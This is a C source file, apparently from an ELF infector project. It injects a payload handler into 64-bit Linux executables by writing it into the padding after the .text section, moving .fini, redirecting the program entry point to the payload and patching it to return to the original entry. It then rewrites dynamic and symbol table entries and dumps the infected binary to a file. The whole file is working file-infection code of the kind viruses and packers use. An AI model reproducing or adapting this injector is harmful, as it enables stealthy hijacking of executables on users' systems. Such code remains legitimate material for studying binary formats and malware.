#include <elf.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "infector.h"

#define PAGE_ALIGN_UP(X, Y) (((X) + (Y) - 1) / (Y) * (Y))

/* CODE */
static int check_boundaries(const t_target *target)
{
    Elf64_Ehdr *elf = (Elf64_Ehdr *)target->base;

    if ((elf->e_shoff + (elf->e_shentsize * elf->e_shnum) > target->filesz)
            || (elf->e_phoff + (elf->e_phentsize * elf->e_phnum) > target->filesz)
       )
        return 1;

    return 0;
}

static uint8_t inject(Elf64_Ehdr *elf, void *payload, uint64_t payloadsz)
{
    /* Find text segment and get padding between text segment and next segment */
    uint64_t padding = 0;
    Elf64_Phdr *text_seg = NULL;
    Elf64_Phdr *ph_tab = (Elf64_Phdr *)((void *)elf + elf->e_phoff);
    for (uint16_t i = 0; i < elf->e_phnum; ++i)
    {
        if (ph_tab[i].p_type == PT_LOAD && ph_tab[i].p_flags == (PF_R | PF_X))
        {
            text_seg = &ph_tab[i];
            if (i < elf->e_phnum)
                padding = ph_tab[i + 1].p_offset - (ph_tab[i].p_offset + ph_tab[i].p_filesz);
            break;
        }
    }
    if (!text_seg || padding < payloadsz)
        return 1;

    /* Find .fini and .text sections */
    Elf64_Shdr *text_sect = NULL, *fini_sect = NULL;
    Elf64_Shdr *sh_tab = (Elf64_Shdr *)((void *)elf + elf->e_shoff);
    for (uint16_t i = 0; i < elf->e_shnum; ++i)
    {
        /*
         * We assume that there is a .fini section and that it's at the end of the text segment.
         */
        if ((sh_tab[i].sh_offset + sh_tab[i].sh_size) == (text_seg->p_offset + text_seg->p_filesz))
        {
            fini_sect = &sh_tab[i];
            text_sect = &sh_tab[i - 1];
            break;
        }
    }

    /* Save injection offset */
    Elf64_Off injection_off = text_sect->sh_offset + text_sect->sh_size;

    /* Patch program's entry point */
    Elf64_Off code_entry = elf->e_entry;
    if (elf->e_type == ET_EXEC)
    {
        elf->e_entry = text_sect->sh_addr + text_sect->sh_size;
        patch_payload_addr64(payload, payloadsz, 0xAAAAAAAAAAAAAAAA, 0);
    }
    else
    {
        elf->e_entry = injection_off;
        patch_payload_addr64(payload, payloadsz, 0xAAAAAAAAAAAAAAAA, 1);
    }
    patch_payload_addr64(payload, payloadsz, 0x3333333333333333, code_entry); // return controlflow

    /* Save old .fini offset */
    Elf64_Off old_fini_off = fini_sect->sh_offset;
    /* Get new aligned .fini offset and address */
    Elf64_Off new_fini_off = PAGE_ALIGN_UP(injection_off + payloadsz, fini_sect->sh_addralign);
    Elf64_Addr new_fini_addr = PAGE_ALIGN_UP(text_sect->sh_addr + text_sect->sh_size + payloadsz, fini_sect->sh_addralign);

    /* Move .fini */
    memmove((void *)elf + new_fini_off, (void*)elf + fini_sect->sh_offset, fini_sect->sh_size);

    /* Write payload after .text (overriding old .fini) */
    memmove((void*)elf + injection_off, payload, payloadsz);

    /* Update text segment size */
    text_seg->p_filesz = text_seg->p_filesz - old_fini_off + new_fini_off;
    text_seg->p_memsz = text_seg->p_filesz;

    /* Increase offset of .fini */
    fini_sect->sh_offset = new_fini_off;
    fini_sect->sh_addr = new_fini_addr;

    /* Add payload size to .text size */
    text_sect->sh_size += payloadsz;

    /* Find .dynamic section */
    Elf64_Shdr *dyn_sect = NULL;
    for (uint16_t i = 0; i < elf->e_shnum; ++i)
    {
        if (sh_tab[i].sh_type == SHT_DYNAMIC)
        {
            dyn_sect = &sh_tab[i];
            break;
        }
    }
    if (!dyn_sect)
        return 1;

    /* Find _fini entry in .dynamic */
    Elf64_Dyn *dyn_tab = (Elf64_Dyn *)((void*)elf + dyn_sect->sh_offset);
    const uint64_t dyn_num = dyn_sect->sh_size / dyn_sect->sh_entsize;
    for (uint64_t i = 0; i < dyn_num; ++i)
    {
        /* Patch _fini dynamic address */
        if (dyn_tab[i].d_un.d_ptr == old_fini_off)
        {
            dyn_tab[i].d_un.d_ptr = new_fini_off;
            break;
        }
    }

    /* Find .symtab section */
    Elf64_Shdr *sym_sect = NULL;
    for (uint16_t i = 0; i < elf->e_shnum; ++i)
    {
        if (sh_tab[i].sh_type == SHT_SYMTAB)
        {
            sym_sect = &sh_tab[i];
            break;
        }
    }
    if (!sym_sect)
        return 0;

    /* Find _fini symbol in symbol table */
    Elf64_Sym *sym = (void *)elf + sym_sect->sh_offset;
    const uint64_t sym_num = sym_sect->sh_size / sym_sect->sh_entsize;
    for (uint64_t s = 0; s < sym_num; ++s)
    {
        /* Patch _fini symbol value */
        if (sym[s].st_value == old_fini_off)
        {
            sym[s].st_value = new_fini_off;
            break;
        }
    }

    return 0;
}

int infect_elf64(t_target *target)
{
    if (check_boundaries(target))
        return write_error(target->filename, CORRUPT_ERR);

    // get injection handler
    uint64_t handlersz = 0;
    void *handler = read_file(HANDLER_ELF64_PATH, &handlersz);
    if (!handler)
        return 1;

    // prepare for injection
    Elf64_Ehdr *elf = (Elf64_Ehdr *)target->base;
    if (inject(elf, handler, handlersz))
        return 1;

    free(handler);

    // create patch
    int patch_fd = -1;
    if ((patch_fd = open(PATCH, (O_CREAT | O_WRONLY | O_TRUNC), 0755)) == -1)
        return write_error(PATCH, NULL);

    // dump file into patch
    int ret = 0;
    if (write(patch_fd, target->base, target->filesz) == -1)
        ret = write_error(PATCH, NULL);

    close(patch_fd);

    return ret;
}
